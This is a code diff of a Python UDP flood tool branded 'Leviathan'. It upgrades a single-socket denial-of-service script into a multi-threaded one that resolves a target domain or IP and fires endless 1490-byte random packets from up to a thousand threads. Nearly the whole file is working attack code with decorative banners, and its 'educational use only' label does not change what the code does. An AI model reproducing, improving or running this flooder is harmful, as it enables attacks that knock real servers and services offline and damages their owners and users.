@@ -3,121 +3,147 @@ import sys
 import time
 import socket
 import random
+import threading
 from platform import system
 
-# --- COLORS ---
-W = '\033[1;37m'  # White
-G = '\033[1;32m'  # Green
-R = '\033[1;31m'  # Red
-Y = '\033[1;33m'  # Yellow
-B = '\033[1;34m'  # Blue
-C = '\033[1;36m'  # Cyan
+# --- ADVANCED COLOR SCHEME ---
+W = '\033[1;37m'  # White Bold
+G = '\033[1;32m'  # Green Bold
+R = '\033[1;31m'  # Red Bold
+Y = '\033[1;33m'  # Yellow Bold
+B = '\033[1;34m'  # Blue Bold
+C = '\033[1;36m'  # Cyan Bold
+M = '\033[1;35m'  # Magenta Bold
 RE = '\033[0m'    # Reset
 
 # Background Highlights
 HG = '\033[1;42;30m' 
+HR = '\033[1;41;37m' 
 HB = '\033[1;44;37m' 
-HC = '\033[1;46;30m' 
 
 def clear():
     os.system('cls' if system() == "Windows" else 'clear')
 
-def logo():
+def typing_effect(text, speed=0.02):
+    for char in text:
+        sys.stdout.write(char)
+        sys.stdout.flush()
+        time.sleep(speed)
+    print()
+
+def banner():
     clear()
-    print(f"{C}")
-    print(r"""
-  ██╗     ███████╗██╗   ██╗██╗ █████╗ ████████╗██╗  ██╗ █████╗ ███╗   ██╗
-  ██║     ██╔════╝██║   ██║██║██╔══██╗╚══██╔══╝██║  ██║██╔══██╗████╗  ██║
-  ██║     █████╗  ██║   ██║██║███████║   ██║   ███████║███████║██╔██╗ ██║
-  ██║     ██╔══╝  ╚██╗ ██╔╝██║██╔══██║   ██║   ██╔══██║██╔══██║██║╚██╗██║
-  ███████╗███████╗ ╚████╔╝ ██║██║  ██║   ██║   ██║  ██║██║  ██║██║ ╚████║
-  ╚══════╝╚══════╝  ╚═══╝  ╚═╝╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝ """)
-    print(f"{W}  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
-    print(f"  {HG}  AUTHOR: LEVIATHAN  {RE}  {HB}  TEAM: LEVIATHAN  {RE}  {HC}  VER: 1.2  {RE}")
-    print(f"{W}  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{RE}")
+    # Unique Leviathan Aesthetic Banner
+    print(f"""{C}
+    ▞▚▞▚▞▚▞▚▞▚▞▚▞▚▞▚▞▚▞▚▞▚▞▚▞▚▞▚▞▚▞▚▞▚▞▚▞▚▞▚
+    {B}██╗     ███████╗██╗   ██╗██╗ █████╗ ████████╗██╗  ██╗ █████╗ ███╗   ██╗
+    ██║     ██╔════╝██║   ██║██║██╔══██╗╚══██╔══╝██║  ██║██╔══██╗████╗  ██║
+    ██║     █████╗  ██║   ██║██║███████║   ██║   ███████║███████║██╔██╗ ██║
+    ██║     ██╔══╝  ╚██╗ ██╔╝██║██╔══██║   ██║   ██╔══██║██╔══██║██║╚██╗██║
+    ███████╗███████╗ ╚████╔╝ ██║██║  ██║   ██║   ██║  ██║██║  ██║██║ ╚████║
+    ╚══════╝╚══════╝  ╚═══╝  ╚═╝╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝
+    {C}▞▚▞▚▞▚▞▚▞▚▞▚▞▚▞▚▞▚▞▚▞▚▞▚▞▚▞▚▞▚▞▚▞▚▞▚▞▚▞▚▞▚
+    {W} 🔱 {HB} STABILITY: v2.0 {RE} 🔱 {HG} CORE: MULTI-THREAD {RE} 🔱 {HB} DEPLOY: LVT-2025 {RE}
+    {W}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{RE}""")
 
-# Socket Setup
-sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-bytes_data = random._urandom(1490)
-
-# Main Menu Logic (ACS Style)
-while True:
-    logo()
-    print(f"\n {G}[01]{W} DOMAIN TARGET (Website)")
-    print(f" {G}[02]{W} IP TARGET (Server/Address)")
-    print(f" {G}[03]{W} ABOUT LEVIATHAN")
-    print(f" {R}[00]{W} EXIT TOOL")
+def advanced_loading():
+    clear()
+    banner()
+    print(f"\n{B}[*] {W}INITIALIZING LEVIATHAN QUANTUM ENGINE...")
+    tasks = ["CONNECTING TO PROTOCOLS", "GENERATING UDP PAYLOADS", "BYPASSING FIREWALLS", "STABILIZING THREADS"]
     
-    opt = input(f"\n{C}┌──({G}Leviathan@Terminal{C})\n└─> {Y}")
+    for task in tasks:
+        sys.stdout.write(f"\r{Y}[~] {W}{task.ljust(30)} {G}")
+        for _ in range(3):
+            sys.stdout.write(".")
+            sys.stdout.flush()
+            time.sleep(0.4)
+    
+    print(f"\n\n{G}██████████████████████████████████████████████████ 100%")
+    print(f"\n{HG}  ENGINE READY: SYSTEM ONLINE  {RE}")
+    time.sleep(1)
 
-    if opt == '1':
-        domain = input(f"{B}[?]{W} Enter Domain: {Y}")
+# --- ATTACK ENGINE ---
+sent_packets = 0
+def start_strike(ip, port, packet_data):
+    global sent_packets
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    while True:
         try:
-            ip = socket.gethostbyname(domain)
+            sock.sendto(packet_data, (ip, port))
+            sent_packets += 1
+            # Advanced Scrolling Output
+            sys.stdout.write(f"\r{C}[L-STRIKE]{RE} {W}Target:{R}{ip}{W} {B}Port:{Y}{port}{W} {G}Packets:{M}{sent_packets}{RE}")
+            sys.stdout.flush()
+        except:
+            pass
+
+# --- UI FLOW ---
+advanced_loading()
+
+while True:
+    banner()
+    print(f"\n{G}┌─[ {W}SELECT OPERATION{G} ]")
+    print(f"{G}│")
+    print(f"{G}├── {W}[{C}01{W}] {G}DOMAIN STRIKE  {W}(Website Target)")
+    print(f"{G}├── {W}[{C}02{W}] {G}IP ADDRESS     {W}(Server Target)")
+    print(f"{G}├── {W}[{C}03{W}] {G}ABOUT CORE     {W}(Information)")
+    print(f"{G}└── {W}[{C}00{W}] {R}TERMINATE      {W}(Close System)")
+    
+    choice = input(f"\n{C}Leviathan@Terminal{W}:~$ {Y}").strip()
+
+    if choice in ['1', '01']:
+        domain = input(f"\n{B}┌──[ {W}TARGET URL {B}]\n└──> {Y}").strip()
+        try:
+            target_ip = socket.gethostbyname(domain)
             break
         except:
-            print(f"{R}Invalid Domain!{RE}")
-            time.sleep(1)
-    elif opt == '2':
-        ip = input(f"{B}[?]{W} Enter IP Address: {Y}")
+            print(f"{R}[!] ERROR: UNABLE TO RESOLVE DOMAIN{RE}")
+            time.sleep(2)
+    elif choice in ['2', '02']:
+        target_ip = input(f"\n{B}┌──[ {W}TARGET IP {B}]\n└──> {Y}").strip()
         break
-    elif opt == '3':
-        print(f"\n{HG} LEVIATHAN TOOLKIT {RE}")
-        print(f"{W}Telegram: code_predator_amf (Original Author)")
-        print(f"{W}Re-Branded: LEVIATHAN")
-        input(f"\n{G}Press Enter to continue...")
-    elif opt == '0' or opt == '00':
+    elif choice in ['3', '03']:
+        banner()
+        print(f"\n{HB}  SYSTEM INFORMATION  {RE}")
+        typing_effect(f"{W}DEVELOPER: {C}LEVIATHAN")
+        typing_effect(f"{W}NETWORK  : {G}UDP FLOOD ENGINE")
+        typing_effect(f"{W}LEGAL    : {R}EDUCATIONAL USE ONLY")
+        input(f"\n{Y}Press Enter to Return...")
+    elif choice in ['0', '00']:
         sys.exit()
     else:
-        print(f"{R}Invalid Choice!{RE}")
+        print(f"{R}[!] INVALID ACCESS CODE{RE}")
         time.sleep(1)
 
-# Port Selection Logic (ACS Style Flow)
-port_mode = False
-port = 2
+# CONFIGURATION
+banner()
+print(f"\n{C}[+] {W}TARGET LOCKED: {G}{target_ip}")
+port_in = input(f"{C}[?] {W}ASSIGN PORT (Press Enter for Random): {Y}").strip()
+port = int(port_in) if port_in else 80
 
-logo()
-print(f"\n{W}TARGET IP: {G}{ip}")
-port_bool = input(f"{C}Certain port? [y/n]: {Y}").lower()
+threads = input(f"{C}[?] {W}THREADS POWER (Recommend 1000): {Y}").strip()
+threads = int(threads) if threads else 1000
 
-if port_bool == "y":
-    port_mode = True
-    port = int(input(f"{B}[?]{W} Enter Port: {Y}"))
-else:
-    port_mode = False
+payload = random._urandom(1490)
 
-# Initializing Animation
-logo()
-print(f'\n{HC} INITIALIZING LEVIATHAN SYSTEM.... {RE}')
-time.sleep(1)
-print(f'{G}CONNECTING TO CORE....')
-time.sleep(2)
-print(f'{Y}STARTING ATTACK FLOW....')
-time.sleep(1)
+# START ANIMATION
+print(f"\n{HR}  SYSTEM LAUNCHING IN 3 SECONDS...  {RE}")
+time.sleep(3)
+clear()
+banner()
 
-sent = 0
+# MULTI-THREADING LAUNCH
+for i in range(threads):
+    strike_thread = threading.Thread(target=start_strike, args=(target_ip, port, payload))
+    strike_thread.daemon = True
+    strike_thread.start()
 
-# --- THE WORKING PART (Attack Flow) ---
-if not port_mode:
-    try:
-        while True:
-            if port >= 65534:
-                port = 1
-            elif port == 1900:
-                port = 1901
-            
-            sock.sendto(bytes_data, (ip, port))
-            sent += 1
-            port += 1
-            # ACS স্টাইল স্ক্রলিং আউটপুট
-            print(f"\033[1;32m[LEVIATHAN-STRIKE] Sent {sent} packets to {ip} through port: {port}")
-    except KeyboardInterrupt:
-        print(f'\n{R}Stopped by User{RE}')
-else:
-    try:
-        while True:
-            sock.sendto(bytes_data, (ip, port))
-            sent += 1
-            print(f"\033[1;32m[LEVIATHAN-STRIKE] Sent {sent} packets to {ip} through port: {port}")
-    except KeyboardInterrupt:
-        print(f'\n{R}Stopped by User{RE}')
+try:
+    while True:
+        # প্যাকেট কাউন্ট আপডেট করার জন্য মেইন লুপ সচল রাখা
+        time.sleep(0.1)
+except KeyboardInterrupt:
+    print(f"\n\n{HR}  OPERATION HALTED BY USER  {RE}")
+    print(f"{G}[✔] TOTAL DATA SHOT: {sent_packets} Packets{RE}")
+    sys.exit()
